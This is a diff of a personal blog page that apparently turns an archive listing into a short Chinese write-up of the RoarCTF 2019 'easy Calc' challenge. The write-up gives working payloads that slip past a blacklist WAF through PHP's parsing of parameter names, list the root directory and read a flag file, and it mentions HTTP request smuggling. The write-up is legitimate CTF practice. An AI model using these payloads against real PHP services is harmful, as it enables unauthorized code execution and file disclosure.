@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>archive_a | 大周&#39;blog</title>
+  <title>roarctf2019-easy Calc | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -219,588 +219,123 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 75px;">
-</div>
+      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
+<div class="pattern-center-blank"></div>
+
 <div id="content" class="site-content">
-  <div id="main">
-    <header class="page-header">
-      <h1 class="cat-title">
-      归档</h1>
-      <span class="cat-des">
-        <p>
-        Archives</p>
-      </span>
-    </header>
-    <div id="main-part">
-      <article class="art">
-        <div class="art-main">
-          <div class="art-content">
-            <div id="archives">
-              <p style="text-align:right;">
-                [<span id="al_expand_collapse" style="cursor: s-resize;">
-                全部展开/收缩</span>
-              ]</p>
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">roarctf2019-easy Calc</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2020-5-29&nbsp;
               
-              
-              
-              
-              
+                    
+        ·<span id="readcount"></span>次阅读
+      
+            </p>
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
+<a id="more"></a>
+
+<p>打开题目是这样子的</p>
+<p><img src="/2020/05/29/Calc/QQ%E6%88%AA%E5%9B%BE20200529130023.jpg" alt="QQ截图20200529130023"></p>
+<p>类似一个计算器</p>
+<p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p>
+<p><img src="/2020/05/29/Calc/QQ%E6%88%AA%E5%9B%BE20200529130218.jpg" alt="QQ截图20200529130218"></p>
+<p>打开calc.php可以看到他设置了黑名单</p>
+<p><img src="/2020/05/29/Calc/QQ%E6%88%AA%E5%9B%BE20200529130500.jpg" alt="QQ截图20200529130500"></p>
+<p>那么我们就是要想法绕过</p>
+<p>这里我们是选择用PHP的字符串解析来bypass</p>
+<p>构造payload:</p>
+<p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p>
+<p><img src="/2020/05/29/Calc/1.png" alt="1"></p>
+<p>这里我们发现一个文件f1agg</p>
+<p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p>
+<p>得到flag</p>
+<p>这里我们用HTTP走私漏洞同样也可以解这道题</p>
+<p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p>
+<p><img src="/2020/05/29/Calc/2.png" alt="2">)<img src="/2020/05/29/Calc/3.png" alt="3"></p>
+
+        </div>
+        <!-- .entry-content -->
+        
+        <p></p>
+          
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/" rel="next">
+              <div class="background">
                 
-                <h3 class="al_year">2020年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      05月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2020/05/29/Calc/">
-                          <span style="color:#0bf;">
-                          29日12:57:33</span>
-                          roarctf2019-easy Calc
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/">
-                          <span style="color:#0bf;">
-                          29日12:30:36</span>
-                          极客大挑战2019-EasySQL
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/">
-                          <span style="color:#0bf;">
-                          11日09:43:04</span>
-                          利用cloudflareWorkers制作Google镜像站
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/">
-                          <span style="color:#0bf;">
-                          10日21:10:22</span>
-                          2020网鼎杯青龙组部分wp
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/">
-                          <span style="color:#0bf;">
-                          07日18:16:42</span>
-                          hexo博客添加文章访问密码
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      03月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/">
-                          <span style="color:#0bf;">
-                          26日21:36:59</span>
-                          代码审计day10
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/">
-                          <span style="color:#0bf;">
-                          25日21:49:57</span>
-                          代码审计day9
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/">
-                          <span style="color:#0bf;">
-                          24日22:14:53</span>
-                          代码审计day8
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/">
-                          <span style="color:#0bf;">
-                          23日21:23:41</span>
-                          代码审计day7
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/">
-                          <span style="color:#0bf;">
-                          22日21:40:26</span>
-                          代码审计day6
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/">
-                          <span style="color:#0bf;">
-                          21日23:15:22</span>
-                          代码审计day5
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/">
-                          <span style="color:#0bf;">
-                          20日22:22:05</span>
-                          代码审计day4
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/">
-                          <span style="color:#0bf;">
-                          19日22:38:28</span>
-                          代码审计day3
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/">
-                          <span style="color:#0bf;">
-                          18日21:32:37</span>
-                          代码审计day2
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/">
-                          <span style="color:#0bf;">
-                          17日21:48:33</span>
-                          代码审计day1
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/16/php%E5%AD%A6%E4%B9%A0day5/">
-                          <span style="color:#0bf;">
-                          16日20:54:41</span>
-                          php学习day5
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/">
-                          <span style="color:#0bf;">
-                          15日21:52:40</span>
-                          php学习day4
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/">
-                          <span style="color:#0bf;">
-                          15日17:37:56</span>
-                          Python安装双版本
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/">
-                          <span style="color:#0bf;">
-                          14日22:13:25</span>
-                          php学习day3
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/">
-                          <span style="color:#0bf;">
-                          14日15:32:37</span>
-                          ctfhub-信息泄露-Git泄露
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/">
-                          <span style="color:#0bf;">
-                          13日21:34:25</span>
-                          php学习day2
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/">
-                          <span style="color:#0bf;">
-                          12日15:15:35</span>
-                          php学习day1
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
-                          <span style="color:#0bf;">
-                          10日16:47:23</span>
-                          ctfhub-信息泄泄露_备份文件下载
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/">
-                          <span style="color:#0bf;">
-                          09日16:05:13</span>
-                          攻防世界-php_rce
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/">
-                          <span style="color:#0bf;">
-                          08日13:16:08</span>
-                          ctfshow-萌新赛
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/">
-                          <span style="color:#0bf;">
-                          03日16:25:29</span>
-                          2020年新春战疫—网络安全公益赛-套娃
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/03/03/ctfshow%E6%B8%B8%E6%88%8F%E9%A2%98/">
-                          <span style="color:#0bf;">
-                          03日15:53:31</span>
-                          ctfshow游戏题
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      02月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/">
-                          <span style="color:#0bf;">
-                          15日18:44:32</span>
-                          ctfshow红包题-web
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/02/01/Hgame-Week1-web/">
-                          <span style="color:#0bf;">
-                          01日00:35:15</span>
-                          Hgame-Week1-web
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      01月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/">
-                          <span style="color:#0bf;">
-                          29日16:01:10</span>
-                          护网杯2018-easy_tornado
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-                          <span style="color:#0bf;">
-                          12日15:06:22</span>
-                          强网杯-随便注
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/">
-                          <span style="color:#0bf;">
-                          02日18:03:53</span>
-                          创建单页
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/">
-                          <span style="color:#0bf;">
-                          01日01:01:18</span>
-                          管道符漏洞
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-                
-                <h3 class="al_year">2019年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      12月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2019/12/19/burp%E7%88%86%E7%A0%B4/">
-                          <span style="color:#0bf;">
-                          19日23:49:45</span>
-                          burp爆破
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/">
-                          <span style="color:#0bf;">
-                          06日21:40:08</span>
-                          墨者学院
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2019/12/05/write-up/">
-                          <span style="color:#0bf;">
-                          05日21:11:14</span>
-                          write up
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2019/12/05/ceshi/">
-                          <span style="color:#0bf;">
-                          05日20:49:34</span>
-                          ceshi
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-            </div>
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/512a1fded4940ba8d5f215809ff8c153.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                极客大挑战2019-EasySQL</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "x4KiIidzwmgCbhqx0TEtQk6W-gzGzoHsz",
+        appKey: "uavnoTMwgQJ0F9RrFiIxxgID",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author"></a>
+            </h3>
           </div>
         </div>
-      </article>
-    </div>
-  </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
 
     </div>    
     <div class="ins-search">
